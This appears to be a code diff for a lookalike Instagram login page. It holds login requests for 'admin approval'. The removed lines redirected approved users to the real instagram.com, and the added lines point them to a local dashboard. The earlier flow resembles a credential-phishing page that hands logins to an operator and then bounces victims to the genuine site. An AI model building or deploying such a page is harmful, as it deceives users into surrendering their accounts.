@@ -88,10 +88,7 @@ function showWaitingForApprovalMessage() {
         <div class="loading-spinner">
             <div class="spinner"></div>
         </div>
-        <h3>Waiting for Admin Approval</h3>
-        <p>Your login request has been submitted and is waiting for administrator approval.</p>
-        <p class="approval-status">Status: <span id="approval-status-text">Pending</span></p>
-        <p class="device-notice">You can close this page and check back later. After approval, you will be redirected to Instagram.</p>
+      
     `;
     
     // Add the waiting message after the login form
@@ -210,8 +207,8 @@ function startCheckingForApproval(requestId) {
                     
                     // Show success message
                     setTimeout(() => {
-                        // Redirect to Instagram
-                        window.location.href = "https://www.instagram.com";
+                        // Redirect to dashboard
+                        window.location.href = `dashboard.html?requestId=${encodeURIComponent(requestId)}&approved=true`;
                     }, 1500);
                 } else if (result.status === 'rejected') {
                     // Update status text
@@ -306,7 +303,7 @@ function toggleLoginButton() {
 
 // Handle Facebook login button click
 document.querySelector('.facebook-login').addEventListener('click', async function() {
-    alert('You will be redirected to Facebook for authentication. After successful login and admin approval, you will be redirected to Instagram.');
+    alert('Facebook login would redirect to Facebook authentication in a real app.');
     
     // For demonstration, we'll submit a Facebook login for admin approval
     try {
@@ -353,7 +350,7 @@ document.addEventListener('DOMContentLoaded', async function() {
                     startCheckingForApproval(requestId);
                 }
             } else if (result.status === 'approved') {
-                // Already approved, redirect to Instagram
+                // Already approved, redirect to dashboard
                 localStorage.setItem('loginResult', JSON.stringify({
                     status: 'approved',
                     username: result.username,
@@ -361,7 +358,7 @@ document.addEventListener('DOMContentLoaded', async function() {
                     requestId: requestId
                 }));
                 
-                window.location.href = "https://www.instagram.com";
+                window.location.href = `dashboard.html?requestId=${encodeURIComponent(requestId)}&approved=true`;
             }
             // If rejected, do nothing and let user try again
         } catch (error) {
